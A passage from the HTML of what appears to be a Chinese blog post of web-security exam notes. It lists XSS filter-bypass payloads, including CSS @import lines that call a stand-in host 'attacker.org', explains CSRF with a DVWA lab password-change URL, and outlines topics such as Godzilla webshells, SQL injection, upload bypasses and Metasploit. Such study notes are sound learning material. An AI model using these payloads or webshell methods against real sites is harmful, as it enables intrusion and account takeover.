</span></span><span class=line><span class=cl>&lt;scr&lt;script&gt;ipt&gt;alert(&#39;XSS&#39;)&lt;/scr&lt;script&gt;ipt&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;SCRIPT&gt;alert(&#39;xss&#39;)&lt;/SCRIPT&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>第五类：CSS import
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;style&gt;@import url(&#34;http://attacker.org/malicious.css&#34;);&lt;/style&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;style&gt;@imp\ort url(&#34;http://attacker.org/malicious.css&#34;);&lt;/style&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;STYLE&gt;@im\port&#39;\ja\vasc\ript:alert(&#34;XSS&#34;)&#39;;&lt;/STYLE&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;STYLE&gt;@import&#39;http://jb51.net/xss.css&#39;;&lt;/STYLE&gt;
</span></span></code></pre></td></tr></table></div></div><h3 id=csrf--原理>CSRF 原理</h3><p>CSRF( Cross- site request forgery,跨站请求伪造)也被称为 One ClickAttackt或者 Session Riding,通常缩写为CSRF或者XSRF,是一种对网站的恶意利用。尽管听起来像跨站脚本(XSS),但它与XSs非常不同，XSS利用站点内的信任用户而CSRF通过你装成受信任用户请求受信任的网站。与XSS攻击相比CSRF攻击往往不大流行（因此对其进行防范的资源也相当稀少）也难以防范，所以被认为比XSS更具危险性。</p><p>攻击者利用目标用户的身份，以目标用户的名义执行某些非法操作。CSRF能够做的事情包括：以目标用户的名义发送邮件、发消息，盗取目标用户的账号，甚至购买商品、虚拟货币转账，这会泄露个人隐私并威胁到了目标用户的财产安全。</p><h4 id=考点-3>考点</h4><p>虚拟机下CSRF攻击</p><ol><li><p>简单的话
构建响应的url，
http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=45&amp;password_conf=45&amp;Change=Change#
在本浏览器新建页面后进去构建好的url，页面显示密码修改成功。</p></li><li><p>中等的话
<img src=/upload/2021/12/image-5176172a38b24276947c3a14945a2a64.png loading=lazy alt=image.png>
<img src=/upload/2021/12/image-0deae3d355b0474c809a8a2e5e3dc52c.png loading=lazy alt=image.png></p></li></ol><h2 id=杂项>杂项</h2><p>哥斯拉木马的使用，远程控制，远程控制机上上传文件生成一个用户</p><p>Php代码理解，分析漏洞</p><ol><li>网络安全形式
（通过什么方法防范什么问题达到什么效果）通过采取必要措施，防范对网络的攻击、入侵、干扰、破坏和非法使用以及意外事故，使网络处于可靠运行的状态，以及保障网络的存储，传输，处理信息的完整性，保密性，可用性的能力。
网络安全：网络运行（服务器崩溃）+网络信息安全</li><li>网络安全渗透 攻击 网页篡改 远程攻击
渗透过程（流程图会画）
踩点 提权
检索方式:site inurl</li><li>网络安全 渗透工程师 职业</li><li>开发 大数据</li><li>SQL注入 Union boolean 报错信息
Union 函数 -版本号（目的：漏洞 利用）
Boolean &ndash;(yes/no) 枚举 报错信息</li><li>登录 查询</li><li>SQL语句 标准 常规 异类</li><li>库、表、字段&mdash;> 管理 系统表 &ndash;> 加密存储</li><li>工具
bs<br>sqlmap
nmap</li><li>bs&mdash;proxy代理（浏览器） 发出请求 响应response 扫描scanner<br>拦截 篡改 钓鱼 代理
暴力破解（密码字典 原理 工具）</li><li>html静态 交互
部署 php使用&mdash;数据库增删改查IDUS 服务(sqldemo） index.php</li><li>xss
js php
交互 对话框
反射型 存储型 脚本 执行
dom型</li><li>文件上传</li><li>哥斯拉&mdash;做木马 php
绕过 Js
文件类型 绕过
文件后缀 绕过
远程控制</li><li>IP端口 URL &mdash;>网络</li><li>靶机 物理机 （必考）</li><li>test.sql上传数据库 导入数据</li><li>CSRF</li><li>KALI msf ms</li></ol></section><footer class=article-footer><section class=article-tags><a href=/tags/security/>security</a></section><section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg><span>Licensed under CC BY-NC-SA 4.0</span></section></footer><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/katex.min.css integrity="sha256-J+iAE0sgH8QSz9hpcDxXIftnj65JEZgNhGcgReTTK9s=" crossorigin=anonymous><script src=https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/katex.min.js integrity="sha256-InsNdER1b2xUewP+pKCUJpkhiqwHgqiPXDlIk7GzBu4=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/contrib/auto-render.min.js integrity="sha256-y39Mpg7V3D4lhBX4x6O0bUqTV4pSrfgwEfGKfxkOdgI=" crossorigin=anonymous defer></script><script>window.addEventListener("DOMContentLoaded",()=>{renderMathInElement(document.querySelector(`.article-content`),{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1},{left:"\\(",right:"\\)",display:!1},{left:"\\[",right:"\\]",display:!0}],ignoredClasses:["gist"]})})</script></article><script src=https://giscus.app/client.js data-repo=resyon/resyon.github.io data-repo-id=R_kgDOG3ywMg data-category data-category-id=DIC_kwDOG3ywMs4CWKPk data-mapping=pathname data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=en crossorigin=anonymous async></script>
<script>function setGiscusTheme(e){let t=document.querySelector("iframe.giscus-frame");t&&t.contentWindow.postMessage({giscus:{setConfig:{theme:e}}},"https://giscus.app")}(function(){addEventListener("message",t=>{if(event.origin!=="https://giscus.app")return;e()}),window.addEventListener("onColorSchemeChange",e);function e(){setGiscusTheme(document.documentElement.dataset.scheme==="light"?"light":"dark_dimmed")}})()</script><footer class=site-footer><section class=copyright>&copy;
2020 -
2023 Example Site</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.17.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.js defer></script>
<script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>